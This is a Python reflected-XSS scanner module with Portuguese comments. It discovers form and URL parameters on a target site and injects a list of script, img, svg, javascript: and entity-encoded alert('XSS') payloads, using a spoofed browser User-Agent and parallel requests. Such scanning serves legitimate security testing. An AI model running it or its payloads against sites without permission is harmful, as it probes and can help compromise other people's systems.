#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

logger = logging.getLogger("nsf.xss_scanner")

# User-Agent para requisições
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Payloads para detecção de XSS
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert('XSS')//",
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert('XSS')//",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "><script>alert('XSS')</script>",
    "</script><script>alert('XSS')</script>",
    "'; alert('XSS'); var a='",
    "javascript\\x3Aalert('XSS')",
    "javascript&#58;alert('XSS')",
    "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041",
    "&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29",
]

def scan_xss(target, params=None):
    """
    Escaneia um site em busca de vulnerabilidades Cross-Site Scripting (XSS).
    
    Args:
        target (str): URL alvo (ex: https://exemplo.com)
        params (list): Lista de parâmetros a serem testados. Se None, será feita uma detecção automática.
    
    Returns:
        dict: Resultado do scan com vulnerabilidades encontradas
    """
    logger.info(f"Iniciando scan de XSS em {target}")
    
    # Normalizar URL alvo
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Headers para requisições
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    # Se nenhuma lista de parâmetros fornecida, tentar descobrir formulários e parâmetros
    if not params:
        params = discover_parameters(target, headers)
    
    # Configurações para teste
    test_urls = []
    
    # Testar URL original
    original_url_parsed = urlparse(target)
    query_params = parse_qs(original_url_parsed.query)
    
    if query_params:
        for param in query_params.keys():
            test_urls.append({
                'url': target,
                'method': 'GET',
                'param': param,
                'type': 'url'
            })
    
    # Adicionar parâmetros descobertos
    for param in params:
        # Se for uma URL completa com método
        if isinstance(param, dict) and 'url' in param and 'method' in param and 'param' in param:
            test_urls.append(param)
        # Se for apenas um nome de parâmetro
        elif isinstance(param, str):
            if query_params:
                # Se a URL já tem parâmetros, adicionar este como outro teste
                test_urls.append({
                    'url': target,
                    'method': 'GET',
                    'param': param,
                    'type': 'url'
                })
            else:
                # Se a URL não tem parâmetros, criamos uma URL de teste
                test_url = f"{target}?{param}=test"
                test_urls.append({
                    'url': test_url,
                    'method': 'GET',
                    'param': param,
                    'type': 'url'
                })
    
    # Remover duplicatas
    unique_tests = []
    seen = set()
    for test in test_urls:
        test_key = f"{test['url']}-{test['method']}-{test['param']}"
        if test_key not in seen:
            seen.add(test_key)
            unique_tests.append(test)
    
    # Resultados
    vulnerabilities = []
    
    # Função para testar um único payload
    def test_payload(test, payload):
        url = test['url']
        method = test['method']
        param = test['param']
        param_type = test.get('type', 'url')
        
        try:
            if method == 'GET':
                # Construir URL com o payload
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                test_url = parsed_url._replace(query=new_query).geturl()
                
                response = requests.get(test_url, headers=headers, timeout=10)
            else:  # POST
                data = {param: payload}
                response = requests.post(url, headers=headers, data=data, timeout=10)
            
            # Verificar se o payload está refletido na resposta
            soup = BeautifulSoup(response.text, 'html.parser')
            html_content = str(soup)
            
            # Verificar se o payload está refletido de forma que poderia ser executado
            vulnerable = False
            evidence = ''
            
            # Verificar diferentes tipos de payloads
            if "<script>" in payload:
                vulnerable = payload in html_content
                if vulnerable:
                    evidence = f"Payload script refletido sem sanitização"
            elif "<img" in payload:
                vulnerable = payload in html_content
                if vulnerable:
                    evidence = f"Payload img refletido sem sanitização"
            elif "<svg" in payload:
                vulnerable = payload in html_content
                if vulnerable:
                    evidence = f"Payload svg refletido sem sanitização"
            elif "javascript:" in payload:
                # Verificar se o payload está em um atributo href ou src
                if f'href="{payload}"' in html_content or f"href='{payload}'" in html_content:
                    vulnerable = True
                    evidence = f"Payload javascript: refletido em atributo href"
                elif f'src="{payload}"' in html_content or f"src='{payload}'" in html_content:
                    vulnerable = True
                    evidence = f"Payload javascript: refletido em atributo src"
            elif "&#" in payload:
                # Payloads com codificação HTML
                if payload in html_content:
                    vulnerable = True
                    evidence = f"Payload com codificação HTML refletido sem sanitização"
            
            # Verificar se o payload foi codificado mas ainda pode ser vulnerável
            if not vulnerable:
                # Verificar versões codificadas do payload
                encoded_variations = [
                    payload.replace("<", "&lt;").replace(">", "&gt;"),
                    payload.replace("'", "&#39;").replace('"', "&quot;"),
                    payload.replace("'", "&#x27;").replace('"', "&quot;")
                ]
                
                for encoded in encoded_variations:
                    if encoded in html_content:
                        # Se o payload foi codificado, verificar o contexto
                        if "onerror=" in payload and f"onerror=" in html_content:
                            vulnerable = True
                            evidence = f"Payload onerror parcialmente codificado mas ainda pode ser vulnerável"
                            break
                        elif "onload=" in payload and f"onload=" in html_content:
                            vulnerable = True
                            evidence = f"Payload onload parcialmente codificado mas ainda pode ser vulnerável"
                            break
            
            if vulnerable:
                return {
                    'url': url,
                    'method': method,
                    'param': param,
                    'payload': payload,
                    'vulnerable': True,
                    'details': evidence
                }
            
            return None
        
        except Exception as e:
            logger.debug(f"Erro ao testar payload {payload} em {url}, parâmetro {param}: {str(e)}")
            return None
    
    # Testar todos os payloads em todas as URLs
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        
        for test in unique_tests:
            for payload in XSS_PAYLOADS:
                futures.append(executor.submit(test_payload, test, payload))
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                # Verificar se já existe um resultado para este parâmetro
                param_exists = False
                for vuln in vulnerabilities:
                    if (vuln['url'] == result['url'] and 
                        vuln['method'] == result['method'] and 
                        vuln['param'] == result['param']):
                        param_exists = True
                        break
                
                if not param_exists:
                    vulnerabilities.append(result)
                    logger.info(f"Vulnerabilidade XSS encontrada: {result['url']}, parâmetro {result['param']}")
    
    return {
        'vulnerabilities': vulnerabilities,
        'tested_parameters': len(unique_tests),
        'tested_payloads': len(XSS_PAYLOADS),
        'vulnerable_count': len(vulnerabilities),
        'target': target
    }

def discover_parameters(target, headers):
    """
    Descobre parâmetros a serem testados em uma URL.
    
    Args:
        target (str): URL alvo
        headers (dict): Headers para requisição
    
    Returns:
        list: Lista de parâmetros descobertos
    """
    discovered_params = []
    
    try:
        # Obter a página
        response = requests.get(target, headers=headers, timeout=10)
        
        if response.status_code != 200:
            logger.warning(f"Não foi possível acessar a página: {response.status_code}")
            return discovered_params
        
        # Usar BeautifulSoup para analisar o HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Encontrar formulários e seus campos
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'GET').upper()
            
            # Construir URL completa para o formulário
            form_url = urljoin(target, form_action) if form_action else target
            
            # Encontrar campos de entrada
            inputs = form.find_all(['input', 'textarea', 'select'])
            for input_field in inputs:
                input_name = input_field.get('name')
                if input_name:
                    # Adicionar à lista de parâmetros
                    discovered_params.append({
                        'url': form_url,
                        'method': form_method,
                        'param': input_name,
                        'type': 'form'
                    })
        
        # Encontrar links com parâmetros
        links = soup.find_all('a', href=True)
        for link in links:
            href = link['href']
            if '?' in href:
                link_url = urljoin(target, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params.keys():
                    discovered_params.append({
                        'url': link_url,
                        'method': 'GET',
                        'param': param,
                        'type': 'url'
                    })
    
    except Exception as e:
        logger.error(f"Erro ao descobrir parâmetros: {str(e)}")
    
    return discovered_params